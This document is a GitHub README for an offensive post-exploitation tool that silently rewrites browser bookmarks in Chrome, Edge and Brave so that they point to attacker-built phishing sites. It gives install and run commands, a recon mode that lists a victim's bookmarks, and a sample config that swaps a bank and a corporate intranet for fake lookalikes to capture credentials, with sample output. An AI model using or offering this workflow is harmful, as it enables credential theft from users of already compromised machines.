# BookSET - Bookmarks Social Engineer Tool

A simple script for Post-Exploitation - by @_mrpack

This script was generated to modify all URLs in BookMarks from some web browsers like Google Chrome, Brave and Edge.

This script can be used to capture some credentials with Phishing sites or just redirect the "victim" to your EvilServer.


# ¿How it works? :

Let's clone the repository and install some libraries:

```bash
git clone https://github.com/edwardosorio/BookSET.git

cd BookSET

pip install -r requirements.txt

```
that's it :D !!


## [+] Help ! :

if you need to know the parameters from the script, pls type:

```bash
python bookSET.py -h


 ____              _     ____  _____ _____
| __ )  ___   ___ | | __/ ___|| ____|_   _|
|  _ \ / _ \ / _ \| |/ /\___ \|  _|   | |
| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|


[ just a simple post-exploitation tool :) by _mrpack ]

usage: bookSET.py [-h] [-recon] [-replace]

Get and Replace all Urls from Google Chrome BookMarks

optional arguments:
  -h, --help  show this help message and exit
  -recon      Get all URLs Bookmarks
  -replace    Replace URLs Bookmarks


```


## [+] Recon Mode :

If you want to know what BookMarks the target has, then we just need to execute the following command line:

```bash
python bookSET.py -recon

```

and the output should be something like this:

```bash

 ____              _     ____  _____ _____
| __ )  ___   ___ | | __/ ___|| ____|_   _|
|  _ \ / _ \ / _ \| |/ /\___ \|  _|   | |
| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|


[ just a simple post-exploitation tool :) by _mrpack ]

[+] Getting Urls from BookMarks:
 
 - https://www.facebook.com
 - https://www.bank.com
 - https://www.twitter.com
 - https://www.instagram.com
 - https://intranet.companie.org

[+] Total of BookMarks identified : [5]

```

## [+] bookmarks.json file content :

Now that we know all the BookMarks that the target has, we can check all the URLs and just make a few "fake websites"  for some URLs that we want... 

Once we make the phishing sites, we can configure our "bookmarks.json" file, the content of "bookmarks.json" it's easy to understand, and the "current_url" it's the URL that we want to change and replace it with "new_url":

```bash

{
    "bookmark_bar": [
      {
        "current_url": "https://www.bank.com/",
        "new_url": "https://www.fakebank.com/"
      },
      {
        "current_url": "https://intranet.companie.org/",
        "new_url": "https://intranet.fakecompanie.org/"
      }
    ]
  }
  
  ```

## [+] Replace Mode :

Now that we configured the bookmarks.json file we can execute again our script with -replace parameter:

```bash
python bookSET.py -replace

```

and the output should be something like this:

```bash

 ____              _     ____  _____ _____
| __ )  ___   ___ | | __/ ___|| ____|_   _|
|  _ \ / _ \ / _ \| |/ /\___ \|  _|   | |
| |_) | (_) | (_) |   <  ___) | |___  | |
|____/ \___/ \___/|_|\_\|____/|_____| |_|


[ just a simple post-exploitation tool :) by _mrpack ]

[+] URLs modified:

     [-] https://www.fakebank.com/
     [-] https://intranet.fakecompanie.org/

[+] Total of BookMarks replaced : [2]
Chrome it's running !!

[+] Chrome was Closed !
...
...
...
...
[+] Opening Chrome !

[+] Done !!

```
once the script finished we can check all the changes.

![](https://secthings.io/assets/images/bookset/fakebank.png) 

![](https://secthings.io/assets/images/bookset/intranetcompanie.png)



NOTE: This script was tested for the following Web Browsers:

- Google Chrome
- Edge
- Brave

And tested for the following O.S:

- windows
- linux
- mac

You just need to change the Browser Path
